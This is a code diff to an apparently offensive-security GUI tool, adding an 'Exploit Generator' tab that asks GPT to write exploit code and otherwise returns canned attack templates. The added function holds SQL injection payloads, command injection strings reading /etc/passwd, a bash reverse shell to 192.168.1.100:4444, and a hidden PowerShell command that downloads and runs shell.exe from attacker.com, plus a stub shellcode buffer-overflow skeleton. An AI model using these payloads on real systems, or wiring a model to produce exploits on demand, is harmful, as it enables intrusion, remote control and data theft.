@@ -133,6 +133,14 @@ except ImportError:
     ExploitTomeTab = None
     HAS_EXPLOIT_TOME = False
 
+# Exploit Generator Tab - AI Exploit Generation from File Analysis
+try:
+    from exploit_generator_tab import ExploitGeneratorTab
+    HAS_EXPLOIT_GEN = True
+except ImportError:
+    ExploitGeneratorTab = None
+    HAS_EXPLOIT_GEN = False
+
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # OpenAI GPT Integration (v1.0+ API)
@@ -4082,6 +4090,14 @@ class HadesGUI(QMainWindow):
                 self.tabs.addTab(ExploitTomeTab(), "📚 Exploit Tome")
             except Exception as e:
                 logger.warning(f"Exploit Tome tab failed: {e}")
+        if HAS_EXPLOIT_GEN:
+            try:
+                self.exploit_gen_tab = ExploitGeneratorTab(
+                    ai_callback=self.generate_response_for_exploit_gen
+                )
+                self.tabs.addTab(self.exploit_gen_tab, "⚔️ Exploit Generator")
+            except Exception as e:
+                logger.warning(f"Exploit Generator tab failed: {e}")
         self.tabs.addTab(self._create_cache_tab(), "📂 Cache Scanner")
         self.tabs.addTab(self._create_code_tab(), "💻 Code Analysis")
         self.tabs.addTab(self._create_code_helper_tab(), "💻 Code Helper")
@@ -8580,6 +8596,116 @@ You can help with: port scanning, vulnerability assessment, exploit research, an
         self._add_chat_message("assistant", f"🤖 Agent finished. Success={success}. {summ}\nErrors: {errs[-1] if errs else 'None'}")
         self.agent_start.setEnabled(True)
         self.agent_stop.setEnabled(False)
+    
+    def generate_response_for_exploit_gen(self, prompt: str) -> str:
+        """Generate AI response for exploit generator tab
+        
+        Args:
+            prompt: The prompt for exploit generation
+            
+        Returns:
+            Generated exploit code or analysis
+        """
+        try:
+            # Try to use GPT chat if available
+            if HAS_OPENAI:
+                try:
+                    api_key = os.getenv("OPENAI_API_KEY", "")
+                    if api_key:
+                        return self.gpt_chat(prompt, api_key)
+                except Exception as gpt_error:
+                    logger.debug(f"GPT not available: {gpt_error}")
+            
+            # Fallback: Return a templated response based on the prompt
+            if "Buffer Overflow" in prompt:
+                return """# Buffer Overflow Exploit
+# Generated template - customize for your target
+
+import struct
+import subprocess
+
+# Shellcode (x64 Linux)
+shellcode = b"\\x48\\xc7\\xc0\\x3b\\x00\\x00\\x00"  # mov rax, 0x3b (execve)
+shellcode += b"\\x48\\xc7\\xc7\\x00\\x00\\x00\\x00"  # mov rdi, 0 (NULL)
+shellcode += b"\\x0f\\x05"  # syscall
+
+# Payload construction
+buffer_size = 256
+padding = b'A' * buffer_size
+return_address = struct.pack('<Q', 0x00000000)  # Replace with actual ROP gadget
+
+payload = padding + return_address + shellcode
+print(f"Payload size: {len(payload)} bytes")"""
+            
+            elif "SQL Injection" in prompt:
+                return """# SQL Injection Payloads
+
+# Union-based
+payload_union = "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()--"
+
+# Time-based blind
+payload_blind = "' AND IF(1=1, SLEEP(5), 0)--"
+
+# Error-based
+payload_error = "' AND extractvalue(rand(), concat(0x3a, database()))--"
+
+# Boolean-based
+payload_bool = "' AND 1=1--"
+payload_bool_false = "' AND 1=2--"
+
+print("Union-based:", payload_union)
+print("Blind:", payload_blind)
+print("Error-based:", payload_error)"""
+            
+            elif "Command Injection" in prompt or "Remote Code Execution" in prompt:
+                return """# RCE/Command Injection Payloads
+
+# Linux shell
+linux_reverse_shell = "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"
+
+# Windows command
+windows_reverse_shell = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; $null = New-Object System.Net.WebClient; $null.DownloadFile('http://attacker.com/shell.exe', 'C:\\\\Windows\\\\Temp\\\\shell.exe'); & 'C:\\\\Windows\\\\Temp\\\\shell.exe'"
+
+# Simple command injection
+simple_cmd = "; whoami"
+simple_cmd2 = "| cat /etc/passwd"
+simple_cmd3 = "`id`"
+
+print("Linux reverse shell:", linux_reverse_shell)
+print("Command injection test:", simple_cmd)"""
+            
+            else:
+                return """# Exploit Template
+# This is a placeholder for AI-generated exploit code
+# 
+# To enable full AI generation:
+# 1. Set your OpenAI API key: export OPENAI_API_KEY=sk-...
+# 2. Or configure it in HadesAI settings
+#
+# In the meantime, customize this template for your target:
+
+print("Target analysis complete")
+print("Generating exploit payload...")
+
+# Add your payload generation logic here
+def generate_payload():
+    return b"A" * 256  # Example buffer
+
+payload = generate_payload()
+print(f"Payload size: {len(payload)} bytes")"""
+                
+        except Exception as e:
+            logger.error(f"Exploit generator AI error: {e}")
+            import traceback
+            traceback.print_exc()
+            return f"""# Exploit Generation Error
+# Error: {str(e)}
+# 
+# Fallback payload template:
+print("Error generating exploit")
+print("Using template approach")
+
+# TODO: Add payload here"""
     
     def closeEvent(self, event):
         """Handle application close - cleanup all threads"""
